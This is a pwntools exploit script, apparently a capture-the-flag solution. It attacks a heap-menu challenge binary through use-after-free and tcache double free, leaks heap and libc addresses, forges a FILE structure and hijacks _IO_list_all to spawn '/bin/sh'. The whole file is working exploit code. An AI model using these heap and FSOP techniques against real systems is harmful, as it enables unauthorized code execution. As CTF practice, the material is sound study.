#!/usr/bin/python3
from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./chall"

"""
HOST = "69.90.132.248"
PORT = 1337 
"""
HOST = "localhost"
PORT = 7777
#"""

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
	libc = ELF('./libc.so.6')
else:
	conn = process(FILE_NAME)
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

elf = ELF(FILE_NAME)

off_unsorted = libc.symbols["__malloc_hook"]+0x10+0x60
off_system = libc.symbols["system"]
off_vtable = libc.symbols["_IO_file_jumps"]
off_list = libc.symbols["_IO_list_all"]

def add(idx, size):
	conn.sendlineafter("Choice: ", "1")
	conn.sendlineafter("Index: ", str(idx))
	conn.sendlineafter("Size: ", str(size))

def edit(idx, data):
	conn.sendlineafter("Choice: ", "2")
	conn.sendlineafter("Index: ", str(idx))
	conn.sendafter("Data: ", data)

def copy(f, t):
	conn.sendlineafter("Choice: ", "3")
	conn.sendlineafter("From: ", str(f))
	conn.sendlineafter("To: ", str(t))
	
def show(idx):
	conn.sendlineafter("Choice: ", "4")
	conn.sendlineafter("Index: ", str(idx))
	conn.recvuntil("print: ")

def delete(idx):
	conn.sendlineafter("Choice: ", "5")
	conn.sendlineafter("Index: ", str(idx))

def exploit():
	add(1, 0x10) # chk_size = 0x20
	add(2, 0x30) # chk_size = 0x40
	add(3, 0x40) # chk_size = 0x50
	add(4, 0x50) # chk_size = 0x60

	for i in range(4):	
		delete(i)
	
	add(0, 0xf0) # size = 0x100 fake file structure
	
	add(1, 0xf0)
	add(2, 0xf0)
	add(3, 0xf0)
	add(4, 0xf0) # block consolidate
	for i in range(1,5):
		delete(i)
	
	add(1, 0x10)
	copy(1, 1)
	show(1) # use after free, heap address leak
	heap_base = u64(conn.recv(6)+b"\x00\x00") - 0x10
	print(hex(heap_base))
	
	edit(1, p64(heap_base+0x100)) #overwrite tcache->key
	copy(1, 1) #tcache doulbe free, inclement tcache->next
	copy(1, 2) #inclement tcache->next
	add(3, 0x10)
	add(4, 0x10) # get overlapped
	delete(1)
	delete(2)
	delete(3)
	
	add(1, 0x30)
	add(2, 0x40)
	edit(4, b"\x00"*0xe+b"\xf1\x04") # overwrite next chunk size
	copy(1, 1) 	
	show(1) # use after free, libc leak
	
	libc_unsorted = u64(conn.recv(6)+b"\x00\x00") 
	libc_base = libc_unsorted - off_unsorted
	libc_system = libc_base + off_system
	libc_vtable = libc_base + off_vtable
	libc_list = libc_base + off_list
	print(hex(libc_base))

	"""
	 create fake FILE structure
	 file_plus_struct is my original class 
	"""
	addr_fake_file = heap_base + 0x3c0
	fake_file = file_plus_struct()
	fake_file._flags = u64("/bin/sh\x00")
	fake_file._vtable = libc_vtable-0x10
	fake_file._IO_write_ptr = 1
	fake_file._IO_write_base = 0
	
	payload = b"\x00"*8
	payload += fake_file.get_payload()
	edit(0, payload)

	delete(1)
	add(1, 0x80) # overlapped
	
	copy(2, 2)
	edit(2, p64(heap_base+0x100))
	delete(2)	
	edit(1, b"\x00"*0x30+p64(0x51)+p64(libc_vtable))
	add(2, 0x40)
	add(3, 0x40)
	edit(3, p64(libc_system))
	
	copy(2, 2)
	edit(2, p64(heap_base+0x100))
	delete(2)
	edit(1, b"\x00"*0x30+p64(0x51)+p64(libc_list-8))
	add(2, 0x40)
	add(0, 0x40)
	edit(0, p64(addr_fake_file))
	
	conn.sendline("")
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
